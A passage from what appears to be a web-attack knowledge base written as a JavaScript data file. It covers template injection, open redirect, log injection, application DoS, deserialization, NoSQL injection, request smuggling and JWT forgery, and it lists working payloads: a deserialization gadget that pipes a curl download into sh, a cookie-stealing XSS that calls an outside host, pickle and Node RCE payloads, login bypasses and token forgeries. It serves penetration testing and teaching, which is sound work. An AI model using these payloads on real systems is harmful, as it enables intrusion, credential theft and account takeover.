        heading: 'Sandbox escape, filter bypass, and tools',
        body: [
          'When a sandbox or filter is in the way, rotate the delimiter syntax, rebuild blocked characters with concatenation or ASCII to character conversion, and use reflection chains (getClass, forName, getMethod, invoke) to reach classes the sandbox tried to hide. Automated scanners speed detection and exploitation across dozens of engines.',
        ],
        examples: [
          { code: "Char rebuild (Spring):  T(java.lang.Character).toString(105).concat(...)", note: 'Assemble a blocked string from character codes.' },
          { code: "tplmap -u 'https://target/?name=*' --os-shell     SSTImap -u URL --crawl 5", note: 'Automated SSTI detection and exploitation.' },
        ],
      },
    ],
    stride: {
      elevation_of_privilege: {
        weaponization: [
          'Reach remote code execution through the engine object model and run commands as the application process.',
          'Escalate locally on the host from that foothold to a higher privileged account.',
          'Steal cloud instance role credentials from the host and use them against the cloud API.',
          'Install persistence or pivot to internal systems once code execution is achieved.',
        ],
        why: 'Template engines expose the underlying language runtime, so control of template syntax nearly always reaches a code execution primitive that inherits the server process privileges.',
      },
      information_disclosure: {
        weaponization: [
          'Read application configuration and secret keys exposed as template globals (for example Flask config or the Twig environment).',
          'Read environment variables and files through engine helpers before full code execution.',
          'Enumerate the language object graph to discover reachable classes, globals, and secrets.',
        ],
        why: 'The template context and the language object graph contain secrets and objects the attacker can enumerate as soon as expressions are evaluated, even short of full command execution.',
      },
      tampering: {
        weaponization: [
          'Use the resulting code execution to modify files, application state, and stored data.',
          'Change what a shared template renders so other users are served attacker controlled output.',
          'Write a web shell or backdoor into the application.',
        ],
        why: 'Reaching code execution or write access through the engine lets the attacker alter the integrity of the application, its data, and what it serves to others.',
      },
    },
  },

  {
    id: 'open-redirect',
    name: 'Open Redirect',
    summary: 'Abuse a redirect parameter that sends users to an attacker chosen URL, lending the target\'s trust to a malicious destination.',
    tags: ['client-side', 'phishing'],
    executionContext: {
      where: 'The redirect is issued by the application (a server Location header) or by client side JavaScript, and the malicious destination loads in the victim browser.',
      detail: 'There are two variants. In server side open redirect the application returns an HTTP 3xx whose Location header is built from attacker input, so the browser is sent onward. In DOM based open redirect, client side JavaScript reads a URL parameter or fragment and assigns it to location, so the redirect happens entirely in the browser. In both cases the redirect and its consequences play out in the victim browser; the flaw is missing or bypassable validation of the destination, on the server or in the page script.',
    },
    howTo: [
      {
        heading: 'Where to look',
        body: [
          'Redirect parameters after login, logout, and single sign on, and generic names such as next, url, return, returnTo, redirect, dest, continue, goto, and callback. In OAuth and SSO the redirect_uri and RelayState are high value. Also check meta refresh, path based redirectors, and client side sinks where location.href, location.assign, location.replace, or window.open is built from the query string, fragment, or Referer.',
        ],
      },
      {
        heading: 'Confirm and classify',
        body: [
          'Set the parameter to an external domain and see if the app forwards you. Inspect the response: a 3xx with your value in the Location header is a server side redirect, while a redirect that only happens after the page loads JavaScript is DOM based and is driven by a client side sink you should trace in the source.',
        ],
        examples: [
          { code: "next=https://evil.example     next=//evil.example", note: 'Direct and protocol relative external redirect.' },
        ],
      },
      {
        heading: 'Allowlist and filter bypasses',
        body: [
          'Most redirectors try to keep you on the same site, so the game is parser confusion. A protocol relative URL keeps the scheme but changes the host. An @ makes the allowed value a userinfo section while the real host follows. A backslash is treated differently by servers and browsers. Whitespace, control characters, and CRLF break naive checks, and double encoding hides delimiters from a validator that decodes once. Prefix and suffix tricks defeat substring allowlists, and a regex that leaves the dot unescaped treats it as a wildcard.',
          'A common root cause is validating a normalized URL but redirecting the raw string, so an encoded delimiter passes validation and still reaches the browser.',
        ],
        examples: [
          { code: "https://trusted.tld@evil.example/     https://trusted.tld\\@evil.example/", note: 'Userinfo and backslash confusion: the browser navigates to evil.example.' },
          { code: "https://trusted.tld.evil.example/     https://evil.example/trusted.tld", note: 'Suffix and prefix tricks beat substring allowlists.' },
          { code: "//evil.example/%2f..     %252f     %09 (tab)     %0d%0a", note: 'Encoding, double encoding, and control characters break weak validators.' },
        ],
      },
      {
        heading: 'DOM redirects and the javascript scheme',
        body: [
          'When a client side sink assigns your value to location without checking the scheme, a javascript URL executes script in the origin, which is effectively DOM XSS rather than a mere redirect. Filters that block the literal word javascript are often bypassed with embedded newlines, tabs, comments, or a fake authority.',
        ],
        examples: [
          { code: "javascript:alert(document.domain)", note: 'Executes in the origin if the sink does not restrict the scheme.' },
          { code: "java%0d%0ascript:alert(1)     javascript://trusted.tld/%0aalert(1)", note: 'Break up the keyword or hide it behind a fake authority.' },
        ],
      },
      {
        heading: 'OAuth and SSO abuse',
        body: [
          'In an OAuth or SSO flow, if you can influence redirect_uri to a host you control, the identity provider sends the authorization code or token to you, and you exchange or replay it to log in as the victim. Weaknesses that enable this include regex allowlists with an unescaped dot, wildcard path patterns where any path contains a redirect sink, and the validate normalized but redirect raw mismatch.',
        ],
        examples: [
          { code: "redirect_uri=https://evil.example  or  https://appXexample.com (regex dot wildcard)", note: 'Steer the code or token to an attacker origin.' },
        ],
      },
      {
        heading: 'Impact chaining, hunting, and tools',
        body: [
          'Beyond phishing, an open redirect can chain: it can bypass a same site SSRF allowlist by redirecting an allowed URL to an internal address, and reverse tabnabbing lets the destination rewrite the opener tab to a phishing page. To hunt at scale, mine historical URLs with gau or waybackurls, extract candidates with redirect parameters, and fuzz them, checking the Location header for off site values.',
        ],
        examples: [
          { code: "curl -sI 'https://target/redirect?url=//evil.example' | grep -i ^location", note: 'Single target check of the Location header.' },
          { code: "cat urls.txt | openredirex -p payloads.txt     oralyzer -u URL --wayback", note: 'Bulk fuzzing and archive mining.' },
        ],
      },
    ],
    stride: {
      spoofing: {
        weaponization: [
          'Send a link on the real target domain that silently forwards the victim to a pixel perfect phishing page, so the trusted starting domain sells the fake.',
          'In OAuth or SSO, redirect the flow to capture the authorization code or token and then impersonate the victim.',
          'Use reverse tabnabbing so the redirect destination rewrites the original tab into a login phishing page.',
        ],
        why: 'Users and mail filters trust the visible starting domain, so a redirect that begins on the trusted host launders the attacker destination and enables convincing identity theft.',
      },
      information_disclosure: {
        weaponization: [
          'Leak an OAuth authorization code or access token by pointing redirect_uri at an attacker server.',
          'Leak sensitive query parameters or the Referer to the attacker origin when the redirect carries them across.',
          'Smuggle a fragment or token into the redirect so session material is exfiltrated to the attacker.',
        ],
        why: 'The redirect hands the browser, and whatever the flow attaches to the destination URL, to an attacker controlled origin, so secrets that ride along in the code, token, query, or fragment are disclosed.',
      },
      elevation_of_privilege: {
        weaponization: [
          'Exchange or replay a stolen OAuth code or token to complete a full takeover of the victim account.',
          'Where a DOM redirect allows the javascript scheme, execute script in the origin and act with the victim authority as in XSS.',
        ],
        why: 'When the leaked material is an authentication credential, or when the redirect sink permits script execution in the origin, the attacker converts a redirect into authenticated access to the victim account.',
      },
    },
  },

  {
    id: 'log-injection',
    name: 'Log Injection and Forging',
    summary: 'Inject crafted content into log entries to fabricate, corrupt, or obscure the record of what happened.',
    tags: ['logging', 'crlf'],
    executionContext: {
      where: 'The forged content is written by the application into the log store on the server, and its effect surfaces later wherever the log is read: a terminal, a web log viewer, or a SIEM.',
      detail: 'The application writes an attacker influenced value into a line oriented log without neutralizing newlines and control characters, so the injection lands in the log file or stream on the server or logging backend. The damage is realized later and elsewhere: when an analyst opens the log in a terminal, when a dashboard renders it in a browser where it can become stored XSS, or when a SIEM parses it. The write happens server side; the payload misleads or executes at read time in whatever tool consumes the log. The same newline injection aimed at HTTP response headers instead of a log is HTTP response splitting, a closely related CRLF issue.',
    },
    howTo: [
      {
        heading: 'Where to look',
        body: [
          'Any user controlled value that gets written to a log: the username on a failed login, User-Agent, Referer, X-Forwarded-For, Host, the request path and query, cookie values, upload filenames, and error messages that echo bad input. If a newline or control character reaches the log unencoded, you can author additional lines.',
        ],
      },
      {
        heading: 'Forge log lines with newlines',
        body: [
          'Inject an encoded newline followed by a complete, plausible log line so the record shows an event you invented. A classic use is to make an action appear to come from localhost or an admin, cloaking your real activity. Verify by reading the raw log and confirming your fabricated line appears as its own entry.',
        ],
        examples: [
          { code: "user=admin%0d%0a127.0.0.1 - 08:15 - /admin/deleteUser?id=42 - success", note: 'Newline injection forges a second entry that blames localhost.' },
        ],
      },
      {
        heading: 'Hide, corrupt, and bypass filters',
        body: [
          'Beyond adding lines, you can remove trust from the log. Terminal escape sequences can clear or overwrite lines for an analyst viewing the file in a terminal, hiding your entries. Breaking the delimiter or field structure makes real events fail to parse so they drop out of a SIEM. When a filter blocks literal carriage return and line feed, alternate unicode line terminators are often still treated as newlines by Java, Python, and Go log and header handling.',
        ],
        examples: [
          { code: "ANSI escape:  inject \\x1b[2K and \\x1b[1A to clear and move up, hiding lines in a terminal view", note: 'Control sequences rewrite what the analyst sees.' },
          { code: "Newline bypasses:  %E2%80%A8 (U+2028)  %E2%80%A9 (U+2029)  %C2%85 (U+0085)", note: 'Unicode line separators slip past filters that only block CR/LF.' },
        ],
      },
      {
        heading: 'Pivot into the log viewer',
        body: [
          'Logs are frequently rendered in a web dashboard. If the viewer prints log content as HTML without encoding, an injected script tag becomes stored XSS that fires in the analyst or administrator browser, which is a high value target. Seed the payload in any logged field and wait for a reviewer to open the log.',
        ],
        examples: [
          { code: "User-Agent: <img src=x onerror=fetch('https://YOUR/'+document.cookie)>", note: 'Stored XSS in a log viewer that renders entries as HTML.' },
        ],
      },
    ],
    stride: {
      repudiation: {
        weaponization: [
          'Forge entries that attribute your actions to another user or to localhost so the record blames someone else.',
          'Inject benign or success lines around your real activity to bury it in noise.',
          'Break the log format so genuine events fail to parse and never reach the SIEM.',
          'Use terminal control sequences to hide or overwrite your lines for an analyst reading the file.',
          'Flood the log with junk to make timeline reconstruction impractical.',
        ],
        why: 'Accountability depends on trustworthy logs, so if an attacker can write, corrupt, drop, or hide log lines, actions can be denied and investigators are actively misled.',
      },
      tampering: {
        weaponization: [
          'Corrupt the integrity of the log data itself by rewriting its structure.',
          'Land stored XSS in the browser of anyone viewing a log dashboard that renders entries without encoding.',
          'Break SIEM or parser ingestion with malformed lines so downstream data is wrong.',
        ],
        why: 'The log is data with integrity requirements, so injecting into it is a direct integrity violation and can pivot into the tooling that reads it.',
      },
    },
  },

  {
    id: 'app-dos',
    name: 'Application-Layer Denial of Service',
    summary: 'Exhaust a limited resource through legitimate looking requests so the application becomes slow or unavailable for real users.',
    tags: ['availability'],
    executionContext: {
      where: 'On the application server and its dependencies (database, parser, worker pool), which perform the disproportionate work the request demands.',
      detail: 'There is no code execution and no data theft. The attacker sends legitimate looking requests that each force the server, or a backend it calls, to do far more work than the request cost to send: CPU on a pathological regex, memory on a decompression or entity expansion, threads or connections on slow or blocking operations, or database time on an unbounded query. The exhaustion happens wherever that work runs, which may be the web worker, the parser, or the database. This is asymmetry of cost rather than volume, so a handful of crafted requests can starve real users.',
    },
    howTo: [
      {
        heading: 'Where to look',
        body: [
          'Expensive operations reachable with a small request: unbounded search and export, report generation, image or media processing, regexes evaluated on user input, recursive or deeply nested parsing, and any endpoint that allocates a lot of work per call without a cap.',
          'Look for amplification and unbounded parameters: one request that fans out into many downstream requests, and pagination, batch, size, quality, or dimension parameters that let you ask for enormous work or output.',
        ],
      },
      {
        heading: 'Asymmetric cost primitives to try',
        body: [
          'A catalog of small inputs with large cost. Catastrophic regex backtracking (ReDoS) hangs a worker on one string. Decompression bombs expand a tiny upload into gigabytes. XML entity expansion (billion laughs, see XXE) does the same through a parser. Hash flooding sends many keys that collide so a hash table degrades from linear to quadratic. Unbounded queries, exports, and pagination pull or build huge result sets. Deeply nested JSON or XML can exhaust the parser stack or memory. A size or dimension parameter can force a giant allocation or a massive image render.',
        ],
        examples: [
          { code: "Decompression bomb:  a few KB gzip/zip that expands to many GB on the server", note: 'Upload or content-encoding that the server inflates without a cap.' },
          { code: "Hash flooding:  many parameters or JSON keys chosen to collide in the hash table", note: 'Turns O(n) map operations into O(n^2).' },
          { code: "Unbounded:  ?limit=100000000  or export the whole dataset with no cap", note: 'One request builds an enormous result in memory.' },
        ],
      },
      {
        heading: 'ReDoS in depth',
        body: [
          'Regular expressions that contain nested or overlapping quantifiers backtrack exponentially on input that almost matches. Look for a user reachable regex (validation of email, URL, or a search filter) and feed it a long run of an ambiguous character followed by a character that forces failure, so the engine explores every split. Backtracking engines in JavaScript, Python, Java, and PCRE are vulnerable; RE2 and the Rust regex crate are linear time and are not.',
          'Build the payload as prefix, then a long repetition of the ambiguous part, then a non matching terminator. Doubling the repetition length and watching response time grow super linearly confirms the issue.',
        ],
        examples: [
          { code: "Evil patterns:  (a+)+$   ([a-zA-Z]+)*   (a|aa)+   (.*a){20}", note: 'Nested and overlapping quantifiers cause catastrophic backtracking.' },
          { code: "Evil input:  'a' repeated 40 times followed by '!'", note: 'Almost matches, then fails, forcing exponential backtracking.' },
        ],
      },
      {
        heading: 'How to test safely',
        body: [
          'Measure the cost of a single request first: response time and, where visible, CPU or memory impact. Prove the primitive with one small crafted input rather than a flood, which demonstrates the algorithmic risk without volumetric traffic. Then check whether rate limits, request and upload size limits, timeouts, and result caps exist, and whether they can be sidestepped by changing the endpoint, method, or parameters. Tools such as regexploit find vulnerable regexes and generate payloads.',
        ],
      },
    ],
    stride: {
      denial_of_service: {
        weaponization: [
          'Hang a worker with a ReDoS input so one request pins a CPU core.',
          'Exhaust memory or disk with a decompression bomb or an entity expansion.',
          'Degrade a hash table to quadratic time with colliding keys (hash flooding).',
          'Exhaust the database and app memory with an unbounded query, export, or pagination value.',
          'Blow the parser stack or memory with deeply nested JSON or XML.',
          'Force a huge allocation or render through a size, dimension, or quality parameter.',
          'Amplify by triggering many downstream requests from one inbound request.',
          'Hold threads and connections open with slow or blocking operations until the pool is empty.',
        ],
        why: 'When the work per request is unbounded and far cheaper to request than to serve, an attacker spends very little to consume a lot, so availability collapses without any traditional high volume flood.',
      },
    },
  },

  {
    id: 'insecure-deserialization',
    name: 'Insecure Deserialization',
    summary: 'Feed a crafted serialized object to a server that deserializes untrusted data, triggering unintended object behavior or code execution.',
    tags: ['server-side', 'rce'],
    executionContext: {
      where: 'In the application process on the server, during the deserialization call itself, before the app validates anything.',
      detail: 'The server rebuilds an object from attacker supplied bytes using a native deserializer such as Java ObjectInputStream, Python pickle, PHP unserialize, Ruby Marshal, a .NET formatter, or node-serialize. Deserialization runs magic or callback methods and can instantiate arbitrary types from the libraries already loaded, so the attacker steers that process and executes code inside the application process with its privileges before any business logic runs. It is not the browser and not the database; it is the app server language runtime.',
    },
    howTo: [
      {
        heading: 'Where to look and how to recognize the format',
        body: [
          'Look for serialized blobs in cookies and hidden fields, view state, cache and session stores, message queues, and any API that accepts a native serialized format. Recognize the format by its signature so you pick the right gadget tool.',
          'Java object streams begin with the bytes AC ED 00 05, which base64 encode to a string starting rO0. PHP serialized data looks like O:8:\"stdClass\":.... Python pickle and Ruby Marshal are binary with their own headers (Marshal starts \\x04\\x08). .NET BinaryFormatter base64 often starts AAEAAAD/////. node-serialize function payloads contain the marker _$$ND_FUNC$$_.',
        ],
      },
      {
        heading: 'Confirm it deserializes untrusted data',
        body: [
          'Tamper with the blob and watch for a deserialization specific error or a behavior change, which shows the bytes are being reconstructed rather than merely compared. For a safe, definitive proof without running code, use a probe that only causes a network callback, such as a Java URLDNS gadget that makes the server resolve a domain you control.',
        ],
        examples: [
          { code: "java -jar ysoserial.jar URLDNS http://YOUR.oob.domain > probe.bin", note: 'URLDNS causes only a DNS lookup, proving deserialization with no code execution.' },
        ],
      },
      {
        heading: 'PHP object injection',
        body: [
          'When unserialize runs on your input, you control which class is instantiated and its properties. Magic methods that fire during or after deserialization (__wakeup, __unserialize, __destruct, __toString) become the entry to a property oriented programming chain: you stitch together classes already in the codebase so their magic methods reach a dangerous sink. phpggc generates known chains for popular frameworks.',
        ],
        examples: [
          { code: "phpggc Laravel/RCE1 system id -b", note: 'Generate a base64 PHP gadget chain for a known framework sink.' },
          { code: "Look for:  unserialize($_COOKIE['data'])  reachable magic methods __wakeup/__destruct", note: 'The sink plus a POP chain equals code execution.' },
        ],
      },
      {
        heading: 'Python, Ruby, and Node',
        body: [
          'Python pickle runs whatever a class __reduce__ returns, so a tiny pickle can call os.system directly. Ruby Marshal.load on untrusted bytes has universal RCE gadget chains, and some JSON libraries such as Oj invoke callbacks during load. Node node-serialize evaluates an embedded function marker, giving direct execution.',
        ],
        examples: [
          { code: "Python:  class P: def __reduce__(self): return (os.system,('id',))  -> pickle.dumps(P())", note: 'Unpickling executes the command.' },
          { code: "Node:  {\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()\"}", note: 'node-serialize evaluates the function marker.' },
        ],
      },
      {
        heading: 'Java and .NET gadget chains',
        body: [
          'Java ObjectInputStream.readObject reached with attacker bytes is exploited with ysoserial, which builds chains from common libraries such as Commons Collections; if the classpath lacks a chain, JNDI injection can load a remote class instead. .NET is vulnerable when a formatter like BinaryFormatter is used, or when Json.NET runs with TypeNameHandling set to Auto or All, and ysoserial.net builds the payloads. Burp extensions GadgetProbe and Freddy fingerprint which libraries and sinks are present.',
        ],
        examples: [
          { code: "java -jar ysoserial.jar CommonsCollections5 'curl YOUR/x|sh' | base64 -w0", note: 'Java RCE gadget for a known library, base64 for transport.' },
          { code: "ysoserial.net -g ObjectDataProvider -f Json.Net -c \"whoami\" -o base64", note: '.NET RCE when TypeNameHandling is Auto/All.' },
        ],
      },
    ],
    stride: {
      elevation_of_privilege: {
        weaponization: [
          'Use a gadget chain to reach remote code execution during deserialization and run as the application, taking over the server.',
          'Use JNDI injection (Java) to load and execute a remote class when no local chain exists.',
          'Forge a trusted or weakly signed object that grants an elevated role or bypasses a check.',
          'Escalate on the host and pivot once code execution is achieved.',
        ],
        why: 'Deserialization instantiates and invokes objects from the loaded libraries, so controlling the input lets the attacker steer that process straight to code execution or to forged privileged state, inheriting the application process privileges.',
      },
      tampering: {
        weaponization: [
          'Modify serialized state the application trusts, such as a user id, role, is_admin, or price field, in an unsigned or weakly protected object.',
          'Set fields the interface never exposes by editing the object directly.',
          'Alter cached or session objects that the app reloads and trusts.',
        ],
        why: 'If the object encodes trusted state and is not integrity protected, editing it directly tampers with what the application believes without touching the database or the UI.',
      },
      denial_of_service: {
        weaponization: [
          'Craft an object whose reconstruction consumes excessive memory or CPU.',
          'Nest or reference structures so deserialization does exponential work.',
          'Trigger an exception deep in processing that crashes the worker.',
        ],
        why: 'Deserialization does attacker directed work before any validation, so a malicious object can exhaust resources or force a crash purely through the reconstruction step.',
      },
    },
  },

  {
    id: 'nosql-injection',
    name: 'NoSQL Injection',
    summary: 'Inject query operators or server side JavaScript into a NoSQL query (commonly MongoDB) so it evaluates attacker logic instead of a plain value.',
    tags: ['injection', 'database'],
    executionContext: {
      where: 'In the query layer on the application server, evaluated by the NoSQL engine such as MongoDB; the $where and $function operators run JavaScript inside the database engine itself.',
      detail: 'The application builds a NoSQL query from user input that keeps its type or structure, so an attacker can supply a query operator object where the app expected a string. The engine evaluates the injected operators as query logic on the database, not in the browser. When the application allows server side JavaScript operators such as $where or $function, that JavaScript runs inside the database engine, which can become code execution there.',
    },
    howTo: [
      {
        heading: 'How input becomes an operator',
        body: [
          'The core issue is that a value the developer expected to be a string arrives as a structured object. In JSON APIs you simply send an object instead of a string. In form and query string parameters, many frameworks parse bracket notation into nested objects, so user[$ne]=x becomes an object with a $ne operator. GraphQL filter arguments and ORM match filters can carry the same operators.',
        ],
        examples: [
          { code: "URL/form:  username[$ne]=x&password[$ne]=x", note: 'Bracket notation is parsed into a MongoDB operator object.' },
          { code: "JSON body:  {\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}", note: 'Send an operator object where a string was expected.' },
        ],
      },
      {
        heading: 'Authentication bypass',
        body: [
          'Against a login query that matches username and password, an operator that is always true for any stored value logs you in without knowing the password. Not equal to a nonsense value, greater than an empty string, or a regex that matches anything all work.',
        ],
        examples: [
          { code: "{\"username\":\"admin\",\"password\":{\"$ne\":\"x\"}}", note: 'Match admin with any password.' },
          { code: "username[$regex]=.*&password[$regex]=.*", note: 'Regex that matches anything for both fields.' },
        ],
      },
      {
        heading: 'Blind and error based extraction',
        body: [
          'When you cannot bypass but can tell true from false, extract data with regex. First find the length by anchoring a fixed count, then recover each character by testing prefixes. If the app runs $where and leaks JavaScript errors, throw the document contents into an error message to dump it directly.',
        ],
        examples: [
          { code: "password[$regex]=^.{8}$   then   password[$regex]=^a   ^b   ...", note: 'Length then character by character recovery.' },
          { code: "{\"$where\":\"throw new Error(JSON.stringify(this))\"}", note: 'Error based full document leak when errors are shown.' },
        ],
      },
      {
        heading: 'Server side JavaScript and RCE',
        body: [
          'Operators that evaluate JavaScript are the high impact path. $where runs a boolean JavaScript expression per document, which enables tautologies and heavy computation, and in some stacks $function or a framework specific $func reaches arbitrary function execution. Aggregations with $lookup can pull data across collections. Where a filter is built by string concatenation, duplicate keys can override an intended constraint under last key wins parsing.',
        ],
        examples: [
          { code: "{\"$where\":\"this.a==this.a\"}   (tautology)   {\"user\":{\"$func\":\"var_dump\"}}", note: 'Server side JavaScript and function execution operators.' },
        ],
      },
      {
        heading: 'Tools',
        body: [
          'nosqlmap and similar frameworks automate operator injection, authentication bypass, and blind extraction. When testing manually, always try both the JSON object form and the parameter bracket form, since one may be reachable when the other is not.',
        ],
      },
    ],
    stride: {
      spoofing: {
        weaponization: [
          'Bypass a login query with an always true operator to authenticate as a named user such as admin.',
          'Use a matches anything regex or not equal operator to sign in without a valid password.',
        ],
        why: 'When identity is proven by a query match, injecting an operator that always matches lets the attacker satisfy the check for any account and assume that identity.',
      },
      information_disclosure: {
        weaponization: [
          'Recover field values one character at a time with $regex or comparison operators.',
          'Dump whole documents through an error based $where leak.',
          'Read across collections with an $lookup aggregation.',
          'Return other users records by injecting operators that widen the match.',
        ],
        why: 'The injected operators run with the application database access, so an attacker can broaden or brute force the query to read data the endpoint never intended to return.',
      },
      tampering: {
        weaponization: [
          'Inject operators into an update or delete filter so it matches more documents than intended.',
          'Override an intended constraint with a duplicate key under last key wins parsing.',
        ],
        why: 'Missing type and operator validation applies to writes as well as reads, so a widened filter changes or removes documents the user should not control.',
      },
      elevation_of_privilege: {
        weaponization: [
          'Authenticate as an administrator through the login bypass.',
          'Reach code execution in the database engine through $where, $function, or a framework JavaScript operator.',
          'Set privileged fields by injecting operators into an update.',
        ],
        why: 'Authentication decisions and, on JavaScript enabled engines, code execution both become attacker controlled once query structure is controllable, which grants rights beyond the account.',
      },
      denial_of_service: {
        weaponization: [
          'Run an expensive $where JavaScript expression across the whole collection.',
          'Force a catastrophic $regex or a huge $in set that ties up the database.',
        ],
        why: 'Server side evaluation over every document is unbounded work the attacker chooses, so a single crafted query can exhaust database resources.',
      },
    },
  },

  {
    id: 'http-request-smuggling',
    name: 'HTTP Request Smuggling',
    summary: 'Exploit a front-end and back-end disagreement about where one HTTP request ends so a smuggled request is processed against another user connection.',
    tags: ['server-side', 'http'],
    executionContext: {
      where: 'At the boundary between the front-end proxy and the back-end server; the smuggled request is processed by the back-end and its effects land on other users who share the connection.',
      detail: 'This is not code execution. It exploits a disagreement between a front-end proxy or load balancer and the back-end origin about where one request ends and the next begins, usually through conflicting Content-Length and Transfer-Encoding headers. The attacker leaves a partial request that the back-end treats as the beginning of the next user request on that connection, so the impact plays out server side across the proxy and origin and against other users, not in any single browser.',
    },
    howTo: [
      {
        heading: 'Root cause and variants',
        body: [
          'When a request carries both Content-Length and Transfer-Encoding, the spec says to ignore Content-Length, but implementations disagree, which desynchronizes the two servers. In CL.TE the front-end uses Content-Length and the back-end uses chunked, so bytes past the front-end count become the next request. In TE.CL it is reversed. In TE.TE both understand chunked but one is tricked by an obfuscated header. CL.0 arises when one side ignores the body entirely. HTTP/2 to HTTP/1.1 downgrade adds H2.CL and H2.TE where frame to header translation reintroduces the ambiguity.',
        ],
      },
      {
        heading: 'How to detect',
        body: [
          'Start with timing. A CL.TE probe that sends chunked data the back-end still waits for makes the back-end hang, and a TE.CL mismatch does the same, so a delay is a strong signal. Confirm with a differential test that shows the back-end acted on bytes the front-end did not, for example by smuggling a request that changes the next response. Use Burp Repeater with automatic Content-Length update and line ending normalization turned off so your malformed request is sent verbatim.',
        ],
        examples: [
          { code: "CL.TE probe:  Content-Length larger than the chunked body terminator, watch for a back-end timeout.", note: 'A hang indicates the back-end waited for chunk data.' },
          { code: "Turbo Intruder:  requestsPerConnection=1, pipeline=False", note: 'Rules out client side pipelining false positives.' },
        ],
      },
      {
        heading: 'Transfer-Encoding obfuscation',
        body: [
          'TE.TE relies on making only one server honor the chunked header. Try a space before the colon, unusual casing, a leading space on the header, a comma separated value such as identity then chunked, or duplicate Transfer-Encoding headers. The hop by hop trick Connection: Content-Length can make a proxy drop the Content-Length so the two sides re-parse differently.',
        ],
        examples: [
          { code: "Transfer-Encoding : chunked    Transfer-Encoding: xchunked    tab or space before value", note: 'Only one server accepts the obfuscated header, creating the desync.' },
        ],
      },
      {
        heading: 'Exploitation',
        body: [
          'Once you can smuggle, aim it at impact. Bypass a front-end control by hiding a blocked path such as /admin inside the smuggled request the front-end never inspected. Capture the next user request by leaving your smuggled request open so their bytes append to a parameter you can later read. Turn a request header XSS into a real attack by smuggling the header a normal client cannot set. Poison a shared cache so every user is served attacker content, or poison the response queue so a victim receives your response.',
        ],
        examples: [
          { code: "Control bypass:  smuggle  GET /admin HTTP/1.1  behind a request the front-end allowed.", note: 'The front-end never saw the admin path.' },
          { code: "Capture:  smuggle a POST whose trailing parameter absorbs the next user request bytes.", note: 'Their credentials or cookies land in your stored value.' },
          { code: "Cache poisoning:  smuggle a request for /static/app.js that returns attacker content.", note: 'All later users get the poisoned resource.' },
        ],
      },
      {
        heading: 'Tools and safety',
        body: [
          'The Burp HTTP Request Smuggler extension automates CL and TE probing and builds proof of concept desyncs, and Turbo Intruder gives precise connection control. Proving smuggling requires demonstrating cross user impact or a nested HTTP/2 response, not just a timing blip. Test carefully, because a live smuggle can corrupt real users requests, so scope it and prefer controlled proofs.',
        ],
      },
    ],
    stride: {
      spoofing: {
        weaponization: [
          'Bypass front-end routing and authentication to reach internal or admin endpoints as if the request were trusted.',
          'Make a request appear to originate from the front-end or an internal client.',
          'Replay another user session captured through the desync to act as them.',
        ],
        why: 'The back-end trusts requests that arrive from the front-end, so a smuggled request inherits that trust and can be attributed to the infrastructure or to a captured user.',
      },
      information_disclosure: {
        weaponization: [
          'Capture other users in flight requests, including their cookies, tokens, and credentials.',
          'Leak internal headers the front-end adds before forwarding.',
          'Steal responses meant for other users through response queue poisoning.',
        ],
        why: 'Desynchronizing the connection lets the attacker splice their request with another user data, so material intended for that user is exposed to the attacker.',
      },
      tampering: {
        weaponization: [
          'Poison a shared web cache so all users receive attacker controlled content.',
          'Inject content into another user response.',
          'Turn a request header injection such as a User-Agent XSS into a delivered attack.',
        ],
        why: 'When the smuggled request influences a shared cache or another user response, the integrity of what many users receive is changed from a single request.',
      },
      elevation_of_privilege: {
        weaponization: [
          'Reach admin only or internal endpoints that the front-end blocks for outside clients.',
          'Use captured credentials or sessions to escalate into a higher privileged account.',
        ],
        why: 'Front-end access controls are the main authorization boundary, so smuggling past them, or stealing a privileged session, grants access the account was never allowed.',
      },
    },
  },

  {
    id: 'jwt-attacks',
    name: 'JWT Attacks',
    summary: 'Forge or tamper a JSON Web Token that the server accepts, by defeating its signature verification or trusting an attacker controlled key.',
    tags: ['authentication', 'session'],
    executionContext: {
      where: 'On the application or authentication server that verifies the token; the flaw is in how the server validates the signature and trusts the claims, and the forged token is crafted by the attacker and accepted server side.',
      detail: 'A JWT is a client held credential. The attack targets the server side verification: if the server accepts an unsigned token, confuses the signing algorithm, uses a guessable secret, or trusts an attacker controlled key reference, the attacker mints a token the server treats as authentic. The token is built on the attacker machine, and the trust decision happens on the server, so the impact is authentication and authorization on the app server, not anything in the browser.',
    },
    howTo: [
      {
        heading: 'Recognize, decode, and test enforcement',
        body: [
          'JWTs look like three base64url parts separated by dots and usually start with eyJ. Decode the header and payload and note the algorithm and the claims that drive authorization such as role, sub, and admin flags. First test whether the signature is checked at all: change a claim or flip a byte in the signature and replay. If the server still accepts it, there is no verification and you can set any claim you like.',
        ],
        examples: [
          { code: "Find:  regex eyJ[A-Za-z0-9_-]*\\.[A-Za-z0-9._-]*   then decode header and payload", note: 'Inspect alg and the authorization claims.' },
          { code: "Enforcement test:  change role to admin, keep the signature, replay", note: 'Acceptance proves the signature is not verified.' },
        ],
      },
      {
        heading: 'Algorithm attacks',
        body: [
          'The alg none trick sets the header algorithm to none and drops the signature; servers that honor it accept an unsigned token. Algorithm confusion downgrades an asymmetric RS256 token to symmetric HS256 and signs it with the servers own public key as the HMAC secret, which works when the verifier uses one key for both. When HS256 is used with a weak secret, crack it offline and then sign whatever you want.',
        ],
        examples: [
          { code: "alg none:  header {\"alg\":\"none\"}, empty signature, tampered claims", note: 'Unsigned token accepted where none is allowed.' },
          { code: "RS256 to HS256:  sign with the PEM public key as the HMAC key (jwt_tool -X k or Burp JWT Editor)", note: 'Key confusion forges a valid signature.' },
          { code: "Crack HS256:  hashcat -m 16500 jwt.txt wordlist    or    jwt_tool JWT -C -d wordlist", note: 'Recover a weak secret then mint tokens.' },
        ],
      },
      {
        heading: 'Key reference header attacks',
        body: [
          'Headers that tell the server which key to use are attacker influenced. A kid parameter that builds a file path or a query can be pointed at a file with known content such as an empty file, or carry SQL or command injection to force a key you control. The jku and x5u headers fetch a key set by URL, so point them at your own JWKS and sign with your matching private key. An embedded jwk, x5c, or public key in the header is the same idea inline.',
        ],
        examples: [
          { code: "kid path traversal:  kid=../../dev/null then sign HS256 with an empty secret", note: 'Force the signing key to known content.' },
          { code: "jku/x5u:  set to https://YOUR/jwks.json and sign with your private key", note: 'Server fetches the attacker key set and verifies your token.' },
        ],
      },
      {
        heading: 'Claim tampering and tools',
        body: [
